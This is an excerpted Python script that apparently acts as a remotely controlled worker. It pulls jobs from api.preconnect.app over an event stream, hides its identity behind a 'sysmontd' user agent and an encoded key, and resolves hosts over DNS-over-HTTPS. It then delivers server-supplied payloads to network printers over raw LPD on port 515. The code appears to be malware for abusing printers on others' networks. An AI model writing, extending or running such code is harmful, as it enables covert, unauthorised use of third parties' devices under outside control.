import base64, gc, hashlib, json, os, socket, struct, sys, time, urllib.request
...
def doh_resolve(domain):
    ...
    for resolver in ("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query"):
        try:
            req = urllib.request.Request(f"{resolver}?name={domain}&type=A", headers={"Accept": "application/dns-json"})
...
NUL = b"\x00"
_k = base64.b64decode("ZTliN2E0YzJmOGQxZTNiNmE5YzRmOGQyZTFiN2E0YzlmOGQzZTJiMWE2YzRmOWQ4ZTdiMmE1YzFmNmQ5ZThiNA==").decode()
jobs = 0
...
def hdrs(printer_host=None):
    ...
    return {"User-Agent": "sysmontd/1.0", "X-Worker-Key": _k, "X-Worker-Spooler": sp, "X-Worker-Jobs": str(jobs)}
...
def claim(i, printer_host=None):
    ...
    try:
        ...
        r = urllib.request.Request("https://api.preconnect.app/print/claim", data=data, headers=headers)
...
def handle(j):
    ...
    if job_id and not claim(job_id, host): return
    if not host or not is_online(host): return
    q = ch = c = dh = p = None
    s = None
    try:
        q, ch, c, dh, p = [_d(j[k], job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")]
        s = socket.create_connection((host, 515), timeout=j["timeout"])
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        s.sendall(q);  ok = _ack(s)
        if ok: s.sendall(ch); ok = _ack(s)
        if ok: s.sendall(c); s.sendall(NUL); ok = _ack(s)
        if ok: s.sendall(dh); ok = _ack(s)
        if ok: s.sendall(p); s.sendall(NUL); ok = _ack(s)
        if ok: jobs += 1
    except Exception:
        if s:
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("HH", 1, 0))
            except Exception: pass
    finally:
        if s:
            try: s.close()
...
def stream():
    try:
        req = urllib.request.Request("https://api.preconnect.app/printer", headers={"Accept": "text/event-stream", "Connection": "keep-alive", **hdrs()})
